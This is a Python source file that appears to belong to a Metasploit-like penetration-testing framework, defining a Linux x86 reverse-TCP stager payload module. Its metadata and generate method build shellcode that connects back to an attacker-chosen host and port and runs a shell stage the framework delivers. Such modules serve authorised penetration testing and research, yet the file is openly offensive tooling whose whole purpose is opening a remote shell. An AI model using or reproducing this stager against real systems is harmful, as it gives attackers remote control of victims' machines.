from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x86.reverse_tcp import ReverseTcpX86


class TerasploitModule(ReverseTcpX86, Payload):
    """Linux x86 reverse-TCP stager."""

    NAME: str = "Linux x86 Reverse TCP Stager"
    DESCRIPTION: str = (
        "Linux IA-32 stager that opens a reverse TCP channel to the attacker and executes the companion stage delivered by the framework."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.1"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/linux/x86/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/reverse_tcp_x86.rb",
    ]
    PAYLOAD_TYPE: str = STAGER
    HANDLER: object = PayloadHandler.ReverseTCP
    STAGE_PATH: str = "linux.x86.shell"
    CACHED_SIZE: int = 123
    MAX_SIZE: int | None = 300
    ARCH: Sequence = [ARCH_X86]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    OPTIONS: Sequence = ["LHOST", "LPORT", "EXITFUNC"]

    def generate(self, ctx):
        """Generate the Linux x86 reverse-TCP stager shellcode."""
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))
        retry_count = int(ctx.get_option("StagerRetryCount") or 10)
        sleep_seconds = float(ctx.get_option("StagerRetryWait") or 5.0)
        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()
        shellcode = self.generate_reverse_tcp(
            host=(host, port),
            retry_count=retry_count,
            sleep_seconds=sleep_seconds,
            exitfunc=exitfunc,
        )

        return shellcode
